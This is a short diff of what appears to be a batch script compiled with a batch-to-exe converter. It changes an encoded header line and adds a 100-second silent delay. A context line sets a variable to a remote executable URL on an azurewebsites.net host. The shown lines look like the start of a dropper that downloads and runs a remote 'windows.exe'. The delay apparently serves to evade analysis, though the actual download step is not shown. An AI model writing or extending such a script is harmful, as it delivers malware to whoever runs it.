@@ -26,13 +26,14 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1lbrc4I612hfjdsIDQ9dMBeza28=
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kSqcI4otg==
 ::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
 
+timeout 100 >nul
 
 set files= 'http://mogiant.azurewebsites.net/windows.exe'
 
